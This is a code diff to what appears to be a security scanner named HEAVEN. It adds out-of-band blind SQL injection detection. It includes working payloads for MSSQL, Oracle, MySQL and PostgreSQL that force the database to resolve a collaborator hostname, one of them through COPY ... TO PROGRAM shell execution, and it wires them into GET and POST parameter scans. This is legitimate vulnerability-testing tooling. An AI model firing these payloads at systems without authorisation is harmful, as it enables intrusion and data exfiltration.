@@ -124,6 +124,26 @@ SQLI_TIME_PROBES: list[tuple[str, int, str]] = [
 # Time differential threshold: response must be >= (sleep - 0.5) seconds
 _TIME_THRESHOLD_FACTOR = 0.85
 
+# Out-of-band (DNS-exfil) blind SQLi. Each coaxes the database ENGINE ITSELF to
+# resolve a hostname in HEAVEN's collaborator zone; an observed DNS callback is
+# proof of SQL execution with no reliance on timing or error reflection, so it
+# fires even on a fully-blind endpoint behind a WAF. DB-specific because the
+# function that triggers a name lookup differs per engine. ``{host}`` is the
+# per-probe ``<token>.<zone>`` hostname. Only used when the OAST DNS channel is
+# active (bug-bounty / routable profile); a callback is definitionally zero-FP.
+SQLI_OOB_DNS_PROBES: list[tuple[str, str]] = [
+    # MSSQL — xp_dirtree/xp_fileexist walk a UNC path, forcing a name lookup.
+    ("'; EXEC master..xp_dirtree '\\\\{host}\\x';-- ", "mssql"),
+    ("'; EXEC('master..xp_fileexist ''\\\\{host}\\x''');-- ", "mssql"),
+    # Oracle — UTL_INADDR resolves a hostname directly.
+    ("' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{host}')) IS NOT NULL-- ", "oracle"),
+    # MySQL on Windows — LOAD_FILE on a UNC path triggers an SMB/DNS lookup.
+    ("' AND LOAD_FILE(CONCAT('\\\\\\\\','{host}','\\\\a'))-- ", "mysql"),
+    ("' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\{host}\\\\a')),NULL-- ", "mysql"),
+    # PostgreSQL (superuser) — COPY ... TO PROGRAM runs a shell lookup.
+    ("'; COPY (SELECT '') TO PROGRAM 'nslookup {host}';-- ", "postgres"),
+]
+
 # UNION-based SQLi: a unique marker exfiltrated through `UNION SELECT`. Detection
 # is high-confidence (the marker only appears if our injected SELECT executed and
 # a column was rendered) and reflection-resistant (see _test_sqli_union_param).
@@ -625,12 +645,17 @@ class InjectionScanner:
         request_delay: float = 0.0,
         user_agent: str = "HEAVEN-Scanner/1.0",
         deadline_s: Optional[float] = None,
+        oast=None,
     ) -> None:
         self._sem = asyncio.Semaphore(concurrency)
         self._delay = request_delay
         self._headers = {"User-Agent": user_agent}
         self._seen: set[str] = set()
         self._findings: list[dict] = []
+        # Shared OAST collaborator for out-of-band (DNS-exfil) blind SQLi. When
+        # None, or when its DNS channel is inactive, the OOB probe is skipped and
+        # the scanner behaves exactly as before (error/boolean/union/time only).
+        self._oast = oast
         # Soft wall-clock budget. A slow or rate-limited target (an emulated VM,
         # a WAF-throttled host) can make a full sweep exceed the orchestrator's
         # hard per-task timeout, which cancels the coroutine and DISCARDS every
@@ -963,6 +988,81 @@ class InjectionScanner:
                     cwe="CWE-89",
                 )
                 return
+
+    async def _test_sqli_dns(self, session, url: str, param: str, *,
+                             post: bool = False,
+                             other_fields: Optional[dict] = None) -> None:
+        """Out-of-band blind SQLi via DNS exfil. Fires DB-specific payloads that
+        make the database resolve ``<token>.<zone>``; a recorded DNS callback is
+        hard proof of SQL execution. All probes are fired first, then a single
+        bounded wait polls for ANY token — so it costs one wait window per
+        parameter, not one per payload. No callback ⇒ nothing reported."""
+        oast = self._oast
+        if oast is None or not oast.hostname_for("probe"):
+            return  # no shared collaborator, or DNS channel inactive
+        other_fields = other_fields or {}
+        token_meta: dict[str, tuple[str, str]] = {}
+        for tpl, db in SQLI_OOB_DNS_PROBES:
+            token = oast.new_token()
+            host = oast.hostname_for(token)
+            token_meta[token] = (tpl.format(host=host), db)
+            variants = [tpl.format(host=host)]
+            if tpl.startswith("'"):
+                variants.append(tpl[1:].format(host=host))  # numeric / unquoted context
+            for inj in variants:
+                async with self._sem:
+                    if self._delay:
+                        await asyncio.sleep(self._delay)
+                    if post:
+                        await self._post_rec(session, url, {**other_fields, param: inj},
+                                             self._headers)
+                    else:
+                        await self._get_rec(session, _inject_param(url, param, inj),
+                                            self._headers)
+
+        loop = asyncio.get_running_loop()
+
+        def _wait() -> Optional[str]:
+            deadline = time.monotonic() + 6.0
+            while time.monotonic() < deadline:
+                for t in token_meta:
+                    if oast.hit(t, channel="dns"):
+                        return t
+                time.sleep(0.1)
+            return next((t for t in token_meta if oast.hit(t, channel="dns")), None)
+
+        hit = await loop.run_in_executor(None, _wait)
+        if not hit:
+            return
+        payload, db = token_meta[hit]
+        host = oast.hostname_for(hit)
+        method = "POST" if post else "GET"
+        poc = url if post else _inject_param(url, param, payload)
+        self._add_finding(
+            target=poc,
+            vuln_type="sqli",
+            title=f"SQL Injection ({method}, out-of-band DNS exfil): param '{param}'",
+            severity="critical",
+            confidence=0.95,
+            evidence={
+                "param": param,
+                "payload": payload,
+                "technique": "oob_dns",
+                "method": method,
+                "db_engine": db,
+                "dns_hostname": host,
+                "channels": ["dns"],
+                "callback_count": len(oast.interactions(hit, channel="dns")),
+                "proof": (f"the database resolved {host} — an out-of-band DNS "
+                          "callback to HEAVEN's collaborator proves SQL execution"),
+                "url": url,
+            },
+            remediation=("Use parameterised queries / prepared statements. Also "
+                         "restrict the database's outbound network and disable unused "
+                         "lookup primitives (xp_dirtree, UTL_INADDR, LOAD_FILE, "
+                         "COPY ... TO PROGRAM)."),
+            cwe="CWE-89",
+        )
 
     async def _test_sqli_post(self, session, url: str, param: str,
                                baseline_body: str, other_fields: dict) -> None:
@@ -1375,6 +1475,7 @@ class InjectionScanner:
                 tasks.append(self._test_sqli_boolean_param(session, url, param, baseline))
                 tasks.append(self._test_sqli_union_param(session, url, param, baseline))
                 tasks.append(self._test_sqli_time_param(session, url, param))
+                tasks.append(self._test_sqli_dns(session, url, param))
                 tasks.append(self._test_xss_param(session, url, param))
                 tasks.append(self._test_inclusion_param(session, url, param, baseline))
                 tasks.append(self._test_cmdi_param(session, url, param, baseline))
@@ -1403,6 +1504,7 @@ class InjectionScanner:
                 for param in list(fields.keys()):
                     others = {k: v for k, v in fields.items() if k != param}
                     tasks.append(self._test_sqli_post(session, action, param, baseline, others))
+                    tasks.append(self._test_sqli_dns(session, action, param, post=True, other_fields=others))
                     tasks.append(self._test_xss_post(session, action, param, others))
                     tasks.append(self._test_xss_stored(session, action, param, others))
                     tasks.append(self._test_inclusion_param(
@@ -1530,6 +1632,7 @@ async def scan_for_injections(
     request_delay: float = 0.0,
     stealth_level: str = "normal",
     time_budget: Optional[float] = None,
+    oast=None,
 ) -> dict:
     """
     Top-level function called from the orchestrator.
@@ -1554,5 +1657,5 @@ async def scan_for_injections(
     concurrency, delay = level_map.get(stealth_level, (20, 0.0))
 
     scanner = InjectionScanner(concurrency=concurrency, request_delay=delay,
-                               deadline_s=time_budget)
+                               deadline_s=time_budget, oast=oast)
     return await scanner.scan(targets, crawl_data=crawl_data, forms_by_url=forms_by_url)
